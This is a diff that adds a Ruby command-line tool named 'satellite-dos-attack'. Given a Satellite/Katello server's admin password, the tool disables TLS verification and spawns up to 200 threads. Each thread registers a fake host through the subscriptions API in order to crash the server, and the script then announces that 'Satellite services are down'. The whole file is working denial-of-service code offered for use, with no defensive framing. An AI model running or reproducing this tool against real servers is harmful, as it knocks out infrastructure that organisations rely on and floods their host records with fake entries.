@@ -1,0 +1,183 @@
+#!/usr/bin/ruby
+require 'optparse'
+require 'base64'
+require 'httpclient'
+
+$max_request = 200
+$system_register = 0
+
+class String
+  def green;          "\e[32m#{self}\e[0m" end
+  def bold;           "\e[1m#{self}\e[22m" end
+end
+
+class HelloParser
+  def self.parse(args)
+    options = {}
+    opts = OptionParser.new do |opts|
+      opts.banner = "Usage: ./satellite-dos-attack [options]"
+
+      opts.on('-s', '--satellite hostname', 'Hostname or IP address of satellite server') do |satellite|
+        options[:satellite] = satellite
+      end
+
+      opts.on('-p', '--password password',  'Admin Password of satellite server') do |password|
+        options[:password] = password
+      end
+
+      opts.on('-n', '--numberofhosts hosts',  'Number of fake hosts to register to the satellite server') do |hosts|
+        options[:hosts] = hosts
+      end
+    end
+
+    begin
+      opts.parse(args)
+    rescue Exception => e
+      puts "Exception encountered: #{e}"
+      exit 1
+    end
+
+    options
+  end
+end
+
+
+
+def test_connection(satellite, username, password)
+  
+  uri = "https://"+satellite+"/katello/api/organizations"
+  clnt = HTTPClient.new
+  clnt.ssl_config.verify_mode = 0
+  extheader = { 'Content-Type' => 'application/json', 'Accept' => 'application/json', "Authorization" => "Basic " + Base64.encode64(username + ':' + password).gsub("\n",'') }
+  clnt.set_auth(nil, username, password)
+  res = clnt.get(uri, nil, extheader)
+  if res.status == 200
+    return true
+  elsif res.status == 401
+    puts "Unable to authenticate user"
+  elsif res.status == 404
+    puts "ERROR 404 - Incorrect satellite IP/hostname entered"
+  end
+    return false
+end
+
+
+def dosAttack(satellite, username, password, count)
+
+  $flag = 0
+  request_triggered = 0
+  arr = []
+  uri = "https://"+satellite+"/api/hosts/subscriptions"
+
+
+
+  count.times do |x|
+
+    arr[x] = Thread.new {
+      puts "---------------------------------" + x.to_s
+
+      begin
+        hostname = "abc" + x.to_s + "example.com"
+        body = '{"name": "'+ hostname + '","lifecycle_environment_id":"1","content_view_id":"1" }'
+        clnt = HTTPClient.new
+        clnt.ssl_config.verify_mode = 0
+        extheader = { 'Content-Type' => 'application/json', 'Accept' => 'application/json', "Authorization" => "Basic " + Base64.encode64(username + ':' + password).gsub("\n",'') }
+        clnt.set_auth(nil, username, password)
+        res = clnt.post(uri, body, extheader)
+        p res.status    
+        if res.status == 200
+          puts "in"
+          $system_register += 1
+        elsif res.status == 500
+          $flag = 1
+        end
+      rescue
+        Thread.exit
+      end
+
+
+
+      }
+
+      if $flag == 1
+        break
+      end
+
+      
+  end
+  
+
+
+  arr.each {|t| t.join; }
+
+
+  puts "-------------------------------------------------------".bold
+
+  puts "\n\nTotal number of fake systems registered to #{satellite} = ".green + "#{$system_register.to_s} \n".bold.green
+  if $flag == 0
+    puts "Satellite is still up and running. \n\n"
+  elsif $flag == 1
+    puts "Attack Successfull Satellite services are down. \n\n".bold.green
+  else
+    puts "Something was wrong during attack."
+  end
+    
+
+end
+
+
+
+
+
+
+
+
+
+
+if ARGV.empty?
+  options = HelloParser.parse("--help")
+else
+  options = HelloParser.parse(ARGV)
+end
+
+puts "
+
+                                                             
+ooo.   .oPYo. .oPYo.      .oo   o    o                8      
+8  `8. 8    8 8          .P 8   8    8                8      
+8   `8 8    8 `Yooo.    .P  8  o8P  o8P .oPYo. .oPYo. 8  .o  
+8    8 8    8     `8   oPooo8   8    8  .oooo8 8    ' 8oP'   
+8   .P 8    8      8  .P    8   8    8  8    8 8    . 8 `b.  
+8ooo'  `YooP' `YooP' .P     8   8    8  `YooP8 `YooP' 8  `o. 
+.....:::.....::.....:..:::::..::..:::..::.....::.....:..::...
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+                                                                            
+".green
+
+puts "attack is in progress.... \n"
+
+
+
+if options[:satellite] and options[:password] and options[:hosts]
+  username = 'admin'
+  password = options[:password]
+  satellite = options[:satellite]
+  if options[:hosts].to_i > $max_request
+    count = 200
+  else
+    count = options[:hosts].to_i
+  end
+
+            
+  if test_connection(satellite, username, password)
+    dosAttack(satellite, username, password, count)
+  else
+    puts "------ Here2 --------------------------"
+    exit 1
+  end
+         
+end
+
+
+
